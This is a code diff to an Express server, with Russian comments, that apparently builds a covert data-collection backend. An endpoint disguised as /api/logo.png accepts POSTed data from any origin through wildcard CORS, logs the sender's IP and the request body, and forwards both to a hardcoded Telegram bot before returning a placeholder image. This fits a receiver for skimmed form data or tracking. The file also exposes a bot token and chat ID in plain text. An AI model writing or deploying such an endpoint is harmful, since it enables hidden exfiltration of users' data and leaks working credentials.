@@ -1,9 +1,9 @@
 import express from 'express';
-import axios from 'axios'; // Для отправки запросов в Telegram
+import axios from 'axios';
 
 const app = express();
 
-// Middleware для парсинга JSON и urlencoded данных
+// Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -11,24 +11,27 @@ app.use(express.urlencoded({ extended: true }));
 const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
 const TELEGRAM_CHAT_ID = '5018443124';
 
-// Лого в формате Base64
 const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';
 
-// Обработчик POST запросов
+// Обработка CORS (предзапрос OPTIONS)
+app.options('/api/logo.png', (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  res.status(200).end();
+});
+
+// Основной обработчик POST
 app.post('/api/logo.png', async (req, res) => {
   try {
-    // Получаем IP пользователя
-    const userIp = req.ip || 
-                  req.headers['x-forwarded-for'] || 
-                  req.connection.remoteAddress || 
-                  req.socket.remoteAddress;
+    // Настройка CORS
+    res.setHeader('Access-Control-Allow-Origin', '*');
     
-    console.log('Received POST request from IP:', userIp, 'with data:', req.body);
+    const userIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    console.log('POST request from:', userIp, 'data:', req.body);
 
-    // Отправляем данные в Telegram
     await sendToTelegram(userIp, req.body);
 
-    // Отправляем изображение
     const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
     res.setHeader('Content-Type', 'image/png');
     res.setHeader('Content-Length', imageBuffer.length);
@@ -40,21 +43,23 @@ app.post('/api/logo.png', async (req, res) => {
   }
 });
 
-// Функция отправки сообщения в Telegram
-async function sendToTelegram(ip: string | string[] | undefined, data: Request) {
-  try {
-    const message = `🖼️ Новый запрос логотипа\n\n` +
-                   `🖥️ IP: ${ip}\n` +
-                   `📊 Данные: ${JSON.stringify(data, null, 2)}\n` +
-                   `🌐 User-Agent: ${data.headers?.get('user-agent') || 'Не указан'}`;
+// Обработчик для всех остальных методов
+app.all('/api/logo.png', (req, res) => {
+  res.setHeader('Allow', 'POST, OPTIONS');
+  res.status(405).send('Method Not Allowed');
+});
 
+// Функция отправки в Telegram
+// @ts-ignore
+async function sendToTelegram(ip, data) {
+  try {
+    const message = `🖼️ Запрос логотипа\nIP: ${ip}\nДанные: ${JSON.stringify(data)}`;
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
+      text: message
     });
   } catch (error) {
-    console.error('Telegram send error:', error);
+    console.error('Telegram error:', error);
   }
 }
 
